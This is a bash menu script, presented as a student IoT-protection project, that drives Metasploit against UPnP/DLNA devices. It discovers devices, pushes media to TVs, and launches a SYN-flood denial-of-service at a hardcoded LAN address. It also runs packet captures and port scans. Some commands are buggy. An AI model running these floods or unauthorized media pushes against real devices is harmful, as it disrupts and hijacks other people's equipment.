#!/bin/bash  
# Scanner
i="0"
resize -s 25 80
clear
while [ $i -lt 1 ]
do
clear
ip=$(ip addr show wlan0 | awk '/inet / {print $2}' | cut -d/ -f 1)

 echo -e '\e[1;33m
 

        	 Protection Techniques to secure IoT Devices that use UPnP/DLNA 
    
	        ██╗   ██╗██████╗ ███╗   ██╗██████╗     ██████╗  ██████╗ ████████╗
	        ██║   ██║██╔══██╗████╗  ██║██╔══██╗    ██╔══██╗██╔═══██╗╚══██╔══╝
	        ██║   ██║██████╔╝██╔██╗ ██║██████╔╝    ██████╔╝██║   ██║   ██║   
            ██║   ██║██╔═══╝ ██║╚██╗██║██╔═══╝     ██╔══██╗██║   ██║   ██║   
            ╚██████╔╝██║     ██║ ╚████║██║         ██████╔╝╚██████╔╝   ██║   
             ╚═════╝ ╚═╝     ╚═╝  ╚═══╝╚═╝         ╚═════╝  ╚═════╝    ╚═╝  	                                   
                                                                       
        					   _/?\_                                                                   
        					   (҂`_´)                                                                  
     	    				   <,︻,>     
    		    			   _/-\_                                                                   
      
          THE AIM OF THIS PROJECT IS TO HELP PREVENT COMMONLY KNOWN IoT VULNERABILITIES 
                FOR DEVICES THAT USE THE COMMUNICATION PROTOCOLS UPnP and DLNA 

\e[1;34m
                                Created by Lennis Ngugi
                           \e[1;31m
 
 ---------------------------------------------------------------------------------------------------------------
| EXPLANATION OF EACH STEP:                                                                                     |
|-Discover all IoT devices in local network that use both the communication protocals UPnP and DLNA             |
|-The play function illustrates how a poorly configured UPnP could easy be used to use the protocal             |
| DLNA commonly used in TVs                                                                                     |
|-The DOS function enables an automated traffic flood attack that works well for poorly configured IoT          |
| devices                                                                                                       |
| -Monitor live network traffic                                                                                 |
| -Monitor IP port 2323/TCP and 23/TCP for attempts to gain unauthorised control. The tool also enables         |
| anomalous traffic monitoring on port 48101, commonly used to infect devices in an attempt to spread malware.  |
 ---------------------------------------------------------------------------------------------------------------

\e[1;32m
 
						Enter 1 to start UPnP Bot
				Enter 2 to carry out monitoring/port scanning [Prevent UPnP]

[1] 
 |  UPnP/DLNA Scanner
 |  Play Media e.g Image, Video and Audio  
 |  DOS UPnP Device
[1]

[2]
 |  Monitor Traffic
 |  Scan for ports 23, 2323, 28101 
[2]
'
 
service postgresql start
discover='1'
play='0'
dos='3'
monitor='2'
scan='4'


read x



if [ "$x" == "$discover" ]; then                 
echo -e'                    
!Wait 60 seconds to find compitable IoT devices that use the networking protocol UPnP/DLNA!
'
msfconsole -q -x "nanodlna -t 60 list; exit;"						     #UPnP/DLNA Scanner
msfconsole -q -x "nanodlna play quote.jpg; exit;"				#Play Media e.g Image, Video and Audio
msfconsole -q -x "use auxiliary/dos/tcp/synflood; set RHOSTS 192.168.1.13 ; exploit ;exit ;" #DOS UPnP Device
echo "Live Traffic Monitor of Network:" 


elif [ "$x" == "$monitor" ]; then
echo -e '!wait 10 seconds for the monntoring functions to start up!'
msfconsole -q -x "tcpdump; exit ;"    #tcpdump of live traffic
echo "Enter IP address of IoT devies to scan all ports open"
read r
msfconsole -q -x "nmap $r p 1-65535 -T4 ;exit ;" #port scanning 

echo ' '
echo ' Press ENTER to return to Main Menu ' 
echo ' '
read 


elif [ "$x" == "$play" ]; then                        
echo "Enter media you want to play (inluding format e.g mp4, mp3, jpeg)"
echo "Ensure media file is in the same directory as Upnp_Scanner folder"
read r

msfconsole -q -x "nanodlna play $r ;exit ;"
echo ' '
echo ' Press ENTER to return to Main Menu'
echo ' '
read



echo -e '\e[1;33m
 
    
██╗   ██╗██████╗ ███╗   ██╗██████╗     ██╗    ██╗ ██████╗ ██████╗ ██╗     ██████╗ 
██║   ██║██╔══██╗████╗  ██║██╔══██╗    ██║    ██║██╔═══██╗██╔══██╗██║     ██╔══██╗
██║   ██║██████╔╝██╔██╗ ██║██████╔╝    ██║ █╗ ██║██║   ██║██████╔╝██║     ██║  ██║
██║   ██║██╔═══╝ ██║╚██╗██║██╔═══╝     ██║███╗██║██║   ██║██╔══██╗██║     ██║  ██║
╚██████╔╝██║     ██║ ╚████║██║         ╚███╔███╔╝╚██████╔╝██║  ██║███████╗██████╔╝
 ╚═════╝ ╚═╝     ╚═╝  ╚═══╝╚═╝          ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝ 	                                   
                                                                       
     _/?\_                                                                   
     (҂`_´)                                                                  
     <,︻╦╤─ ҉ - - - - - - - - - - - - - - - - - - - - - - - - - - - -514437     
     _/-\_                                                                   
      
  \e[0m



                          Press ENTER to return to Main Menu
'
read
else 



 
echo -e ' \e[1;31m
                                                                           
'

fi

done



